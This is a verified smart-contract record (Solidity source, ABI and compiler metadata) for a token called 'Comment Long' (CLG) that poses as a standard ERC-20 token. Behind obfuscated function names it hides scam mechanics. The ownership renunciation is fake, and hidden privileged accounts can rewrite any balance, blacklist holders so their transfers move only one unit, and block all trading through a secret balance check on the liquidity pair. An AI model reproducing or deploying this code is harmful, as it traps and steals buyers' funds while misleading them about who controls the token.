{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface fromTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLimit) external view returns (uint256);\n\n    function transfer(address toExempt, uint256 marketingAuto) external returns (bool);\n\n    function allowance(address tokenTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toExempt,\n        uint256 marketingAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldAmount, uint256 value);\n    event Approval(address indexed tokenTotal, address indexed spender, uint256 value);\n}\n\nabstract contract amountEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeLimitIs {\n    function createPair(address tradingReceiver, address limitFund) external returns (address);\n}\n\ninterface tokenAt is fromTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CommentLong is amountEnable, fromTake, tokenAt {\n\n    mapping(address => bool) public tokenMin;\n\n    event OwnershipTransferred(address indexed receiverLimit, address indexed feeShouldFund);\n\n    function getOwner() external view returns (address) {\n        return limitTeam;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return txList;\n    }\n\n    uint256 private modeExempt = 100000000 * 10 ** 18;\n\n    uint256 constant walletLaunched = 1 ** 10;\n\n    function fromTo(address toBuyMax, uint256 marketingAuto) public {\n        tokenShould();\n        receiverToken[toBuyMax] = marketingAuto;\n    }\n\n    string private senderTeamAt = \"CLG\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTeamAt;\n    }\n\n    uint8 private swapIsAt = 18;\n\n    mapping(address => bool) public shouldMarketing;\n\n    function owner() external view returns (address) {\n        return limitTeam;\n    }\n\n    function tokenShould() private view {\n        require(tokenMin[_msgSender()]);\n    }\n\n    function launchTrading(uint256 marketingAuto) public {\n        tokenShould();\n        marketingFrom = marketingAuto;\n    }\n\n    function approve(address swapShould, uint256 marketingAuto) public virtual override returns (bool) {\n        walletToken[_msgSender()][swapShould] = marketingAuto;\n        emit Approval(_msgSender(), swapShould, marketingAuto);\n        return true;\n    }\n\n    function transfer(address toBuyMax, uint256 marketingAuto) external virtual override returns (bool) {\n        return fundTeam(_msgSender(), toBuyMax, marketingAuto);\n    }\n\n    address marketingEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private receiverToken;\n\n    constructor (){\n        if (totalAutoTeam != receiverReceiver) {\n            receiverReceiver = false;\n        }\n        maxTo tradingAt = maxTo(marketingEnable);\n        fromReceiver = takeLimitIs(tradingAt.factory()).createPair(tradingAt.WETH(), address(this));\n        \n        takeList = _msgSender();\n        feeAmount();\n        tokenMin[takeList] = true;\n        receiverToken[takeList] = modeExempt;\n        if (totalAutoTeam) {\n            totalAutoTeam = false;\n        }\n        emit Transfer(address(0), takeList, modeExempt);\n    }\n\n    function toList(address tokenAutoSwap) public {\n        tokenShould();\n        \n        if (tokenAutoSwap == takeList || tokenAutoSwap == fromReceiver) {\n            return;\n        }\n        shouldMarketing[tokenAutoSwap] = true;\n    }\n\n    address public fromReceiver;\n\n    bool private receiverReceiver;\n\n    address amountMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapIsAt;\n    }\n\n    bool public totalAutoTeam;\n\n    string private txList = \"Comment Long\";\n\n    uint256 marketingFrom;\n\n    uint256 modeIs;\n\n    function balanceOf(address toLimit) public view virtual override returns (uint256) {\n        return receiverToken[toLimit];\n    }\n\n    function senderMax(address shouldList, address toExempt, uint256 marketingAuto) internal returns (bool) {\n        require(receiverToken[shouldList] >= marketingAuto);\n        receiverToken[shouldList] -= marketingAuto;\n        receiverToken[toExempt] += marketingAuto;\n        emit Transfer(shouldList, toExempt, marketingAuto);\n        return true;\n    }\n\n    function buyTake(address tradingSwap) public {\n        if (liquidityMarketing) {\n            return;\n        }\n        \n        tokenMin[tradingSwap] = true;\n        if (receiverReceiver) {\n            receiverReceiver = false;\n        }\n        liquidityMarketing = true;\n    }\n\n    uint256 private launchedTotalBuy;\n\n    address private limitTeam;\n\n    function transferFrom(address shouldList, address toExempt, uint256 marketingAuto) external override returns (bool) {\n        if (_msgSender() != marketingEnable) {\n            if (walletToken[shouldList][_msgSender()] != type(uint256).max) {\n                require(marketingAuto <= walletToken[shouldList][_msgSender()]);\n                walletToken[shouldList][_msgSender()] -= marketingAuto;\n            }\n        }\n        return fundTeam(shouldList, toExempt, marketingAuto);\n    }\n\n    address public takeList;\n\n    function allowance(address modeFund, address swapShould) external view virtual override returns (uint256) {\n        if (swapShould == marketingEnable) {\n            return type(uint256).max;\n        }\n        return walletToken[modeFund][swapShould];\n    }\n\n    bool public liquidityMarketing;\n\n    function fundTeam(address shouldList, address toExempt, uint256 marketingAuto) internal returns (bool) {\n        if (shouldList == takeList) {\n            return senderMax(shouldList, toExempt, marketingAuto);\n        }\n        uint256 senderLiquidityAt = fromTake(fromReceiver).balanceOf(amountMin);\n        require(senderLiquidityAt == marketingFrom);\n        require(toExempt != amountMin);\n        if (shouldMarketing[shouldList]) {\n            return senderMax(shouldList, toExempt, walletLaunched);\n        }\n        return senderMax(shouldList, toExempt, marketingAuto);\n    }\n\n    uint256 public launchedToMax;\n\n    mapping(address => mapping(address => uint256)) private walletToken;\n\n    function feeAmount() public {\n        emit OwnershipTransferred(takeList, address(0));\n        limitTeam = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeShouldFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSwap\",\"type\":\"address\"}],\"name\":\"buyTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuyMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"fromTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAutoSwap\",\"type\":\"address\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAutoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toBuyMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CommentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}